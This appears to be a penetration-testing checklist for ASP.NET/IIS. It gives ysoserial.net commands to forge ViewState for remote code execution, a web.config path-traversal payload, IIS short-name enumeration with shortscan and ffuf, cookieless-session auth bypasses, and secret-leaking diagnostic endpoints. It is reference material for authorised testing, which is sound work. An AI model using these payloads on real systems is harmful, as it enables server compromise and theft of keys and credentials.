# ASP.NET / IIS

**What it is:** Microsoft web stack. High-value surfaces: **ViewState deserialization** (RCE when the `machineKey` leaks or MAC is off), IIS **8.3 short-name** file disclosure, cookieless-session path tricks, and a set of default diagnostic endpoints that leak secrets.

## Fingerprint
- Cookies `ASP.NET_SessionId`, `.ASPXAUTH`, `ASPSESSIONID`; headers `X-AspNet-Version`, `X-Powered-By: ASP.NET`; `__VIEWSTATE`/`__EVENTVALIDATION` hidden inputs; `.aspx`/`.asmx`/`.ashx`/`.svc` extensions.

## IIS short-name (8.3 tilde) enumeration
- [ ] `shortscan https://target/` or IIS-ShortName-Scanner → recover the first 6 chars of files/dirs the app hides (`SECRET~1.ASP`).
- [ ] Complete the guess by fuzzing: `ffuf -w words -e .asp,.aspx,.ashx,.asmx,.config -u https://target/PARTIALFUZZ`.
- [ ] Leads to hidden admin pages, backups (`web.config`, `~1.BAK`), and source.

## ViewState deserialization → RCE
- [ ] Grab `__VIEWSTATE`. If **MAC disabled** (`enableViewStateMac="false"` — legacy) → forge directly with `ysoserial.net`:
```
ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd" --isdebug --path="/page.aspx"
```
- [ ] If MAC enabled, you need the **machineKey** (`validationKey`/`decryptionKey`). Recover it via LFI/config leak (`?fileName=../../web.config`), then sign the payload:
```
ysoserial.exe -p ViewState -g <gadget> -c "cmd" --path="/page.aspx" --apppath="/" \
  --validationkey=<HEX> --validationalg=SHA1 --generator=<__VIEWSTATEGENERATOR>
```
- [ ] `viewgen` (0xacb) does the same from a leaked machineKey.
- [ ] Also: JSON.NET `TypeNameHandling.All`, `BinaryFormatter`/`LosFormatter`/`ObjectStateFormatter` sinks in custom code → same ysoserial.net gadgets.

## Cookieless-session / path bypass
- [ ] `S(...)` cookieless session segment reaches blocked endpoints: `/admin/login.aspx` → `/admin/(S(x))/login.aspx` slips path-based auth/WAF rules.
- [ ] `..;/`, encoded slashes, and trailing dot/space quirks in IIS path parsing → reach guarded routes.

## Default diagnostic / secret leaks
- [ ] `trace.axd` (request tracing — cookies, session), `elmah.axd` (error log with data + sometimes RCE), `web.config`/`.config` backups, `/obj/Debug/` compiled assemblies, `appsettings.json`, `service-worker-assets.js`.
- [ ] `debug=true` compilation, verbose `.NET` stack traces (paths, versions).
- [ ] Padding-oracle **MS10-070** on old, unpatched ASPX (decrypt/forge ViewState, download `web.config`).

## LFI → machineKey → RCE chain
Download handler traversal (`DownloadCategoryExcel?fileName=../../web.config`) → extract `machineKey` → forge ViewState → RCE. Also pull `bin/*.dll`, decompile in dnSpy for logic/creds.

## Impact
RCE (ViewState / deserialization), source & secret disclosure (short-name, config leaks, decompiled DLLs), auth bypass (cookieless path), full server compromise.

## Report notes
For ViewState RCE, prove with a benign OOB (`ping collab` / `nslookup`) — no reverse shell on live targets. State whether MAC was off or the machineKey leaked (and how). For short-name, show the recovered names, not mass file theft.

## Related
`03-injection/08-deserialization.md` · `03-injection/09-lfi-path-traversal.md` · `08-infra/04-secrets-and-exposure.md` · `10-server-edge/05-http-quirks-and-headers.md`
